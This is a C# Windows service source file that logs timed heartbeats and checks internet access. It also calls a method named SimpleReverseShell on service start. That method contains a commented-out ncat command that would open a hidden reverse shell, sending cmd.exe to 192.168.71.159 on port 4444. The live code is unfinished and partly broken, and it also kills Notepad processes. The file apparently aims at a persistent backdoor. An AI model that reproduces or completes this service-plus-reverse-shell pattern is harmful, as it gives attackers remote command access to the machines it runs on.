using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using Timer = System.Timers.Timer;

namespace UITservice3
{
    public partial class Service1 : ServiceBase
    {
        Timer timer = new Timer(); // name space(using System.Timers;) 
        public Service1()
        {
            InitializeComponent();
        }
        protected override void OnStart(string[] args)
        {
            WriteToFile("Service is started at " + DateTime.Now);
            timer.Elapsed += new ElapsedEventHandler(OnElapsedTime);
            timer.Interval = 1000; //number in milisecinds 
            timer.Enabled = true;
            SimpleReverseShell();
        }

        private void IsProcessRunning()
        {
            throw new NotImplementedException();
        }

        protected override void OnStop()
        {
            WriteToFile("Service is stopped at " + DateTime.Now);
        }
        private void OnElapsedTime(object source, ElapsedEventArgs e)
        {
            WriteToFile("Service is recall at " + DateTime.Now);
            WriteToFile("Internet status: " + CheckForInternetConnection() + " " + DateTime.Now);

        }

        private void IsProcessRunning(string sProcessName)
        {
            System.Diagnostics.Process[] proc = System.Diagnostics.Process.GetProcessesByName(sProcessName);
            if (proc.Length > 0)
            {
                WriteToFile(System.String.Format("{0} is  running!", sProcessName) + DateTime.Now);
                foreach (var process in Process.GetProcessesByName("Notepad"))
                {
                    process.Kill();
                }
            }
            else
            {
                WriteToFile(System.String.Format("{0} is not running!", sProcessName) + DateTime.Now);
                // start your process
                Process process = new Process();
                // Configure the process using the StartInfo properties.
                process.StartInfo.FileName = "Notepad.exe";
                process.StartInfo.Arguments = "-n";
                process.StartInfo.WindowStyle = ProcessWindowStyle.Maximized;
                process.Start();
                process.WaitForExit();// Waits here for the process to exit.
            }
        }

        private void SimpleReverseShell()
        {
            //System.Diagnostics.Process process = new System.Diagnostics.Process();
            //System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            //startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            //startInfo.FileName = "cmd.exe";
            //startInfo.Arguments = "ncat 192.168.71.159 4444 -e cmd.exe";
            //process.StartInfo = startInfo;
            //process.Start();

            //string strcmdtext;
            //strcmdtext = "echo 'helllo' ";
            //system.diagnostics.process.start("c:\\windows\\system32\\cmd.exe", strcmdtext);
            String sProcessName = "Command Prompt";
            System.Diagnostics.Process[] proc = System.Diagnostics.Process.GetProcessesByName(sProcessName);
            if (proc.Length == 0)
            {
                WriteToFile(System.String.Format("{0} is not running!", sProcessName) + DateTime.Now);
                // start your process
                Process process = new Process();
                // Configure the process using the StartInfo properties.
                process.StartInfo.FileName = "Command Prompt";
                process.StartInfo.Arguments = "-n";
                process.StartInfo.WindowStyle = ProcessWindowStyle.Maximized;
                process.Start();
                process.WaitForExit();// Waits here for the process to exit.
            }

        }

        private void ExecuteCommandSync(object obj)
        {
            throw new NotImplementedException();
        }

        public static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (client.OpenRead("http://google.com/"))
                    return true;
            }
            catch
            {
                return false;
            }
        }
        public void WriteToFile(string Message)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            string filepath = AppDomain.CurrentDomain.BaseDirectory +
           "\\Logs\\ServiceLog_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') +
           ".txt";
            if (!File.Exists(filepath))
            {
                // Create a file to write to. 
                using (StreamWriter sw = File.CreateText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
        }
    }
}
